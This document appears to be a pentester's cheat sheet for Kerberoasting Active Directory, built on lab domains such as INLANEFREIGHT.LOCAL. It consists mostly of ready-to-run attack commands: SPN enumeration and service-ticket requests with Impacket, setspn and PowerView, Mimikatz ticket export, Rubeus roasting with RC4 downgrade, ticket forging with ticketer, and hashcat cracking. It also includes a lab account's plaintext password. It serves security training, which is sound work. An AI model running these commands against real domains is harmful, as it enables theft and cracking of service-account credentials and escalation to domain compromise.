# Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

    - From a non-domain joined Linux host using valid domain user credentials.
    - From a domain-joined Linux host as root after retrieving the keytab file.
    - From a domain-joined Windows host authenticated as a domain user.
    - From a domain-joined Windows host with a shell in the context of a domain account.
    - As SYSTEM on a domain-joined Windows host.
    - From a non-domain joined Windows host using runas /netonly.

# From Linux

## GetUserSPNs.py

### Listing SPN Accounts with GetUserSPNs.py

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

### Requesting all TGS Tickets

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

### Requesting a Single TGS ticket

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

#### use the RC4-HMAC Key to get ccache

example: $krb5tgs$23$_management_svc$CERTIFIED.HTB$certified.htb/management_svc_$3ec6d2d73c42a4666917369a3a0181a7$...

Between the two dollars sign.

```bash
python ticketer.py -nthash 3ec6d2d73c42a4666917369a3a0181a7 -domain CERTIFIED.HTB -user management_svc -spn certified.htb/management_svc -target-domain CERTIFIED.HTB -dc-ip 192.168.1.10 -outfile ticket.kirbi

```

# Get a TGT

# Before start

Before u start u need to set the time

```
sudo timedatectl set-ntp off
sudo rdate -n -s IP
```

Use the standard Kerberos client to obtain Ticket Granting Tickets

```
# Request Ticket Granting Ticket
kinit username@DOMAIN.COM

# With password
echo 'password' | kinit username@DOMAIN.COM

# Check tickets
klist

# Destroy tickets
kdestroy
```

### Using Impacket Tools

Use Impacket tools for advanced Kerberos operations and ticket management.

```
# Get TGT
getTGT.py DOMAIN/username:password

# Use ticket
export KRB5CCNAME=username.ccache

# Request service ticket
getST.py -spn service/hostname DOMAIN/username -k -no-pass
```

# From Windows

## Semi manual way.

### Enumerating SPNs with setspn.exe

```powershell
setspn.exe -Q */*
```

### Targeting a Single User

Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz. Let's try this by targeting a single user

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

### Retrieving All Tickets Using setspn.exe

```powershell
setspn.exe -T HTB.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Extracting Tickets from Memory with Mimikatz

```powershell
.\mimikatz

mimikatz: base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz: kerberos::list /export

```

### Preparing the Base64 Blob for Cracking

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

```bash
echo "<base64 blob>" |  tr -d \\n | tee encoded_file
```

### Placing the Output into a File as .kirbi

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

### Extracting the Kerberos Ticket using kirbi2john.py

```bash
kirbi2john sqldev.kirbi | tee crack_file
```

### Modifiying crack_file for Hashcat

**Note**: the newer version of kirbi2john doesn't require that.

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

### Cracking the Hash with Hashcat

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## Automated / Tool Based Route

### Using PowerView to Extract TGS Tickets

### Enumerate spn users

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
```

### Using PowerView to Target a Specific User

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\sqldev_tgs.csv -NoTypeInformation
```

### Exporting All Tickets to a CSV File

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### Way number 2

```powershell
$Password = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
e$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $Password)

Invoke-UserImpersonation -Credential $Cred
Invoke-Kerberoast
```

## Using Rubeus

Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat

```bash
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

```
Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.
```

# Double Hop Issue

https://posts.slayerlabs.com/double-hop/
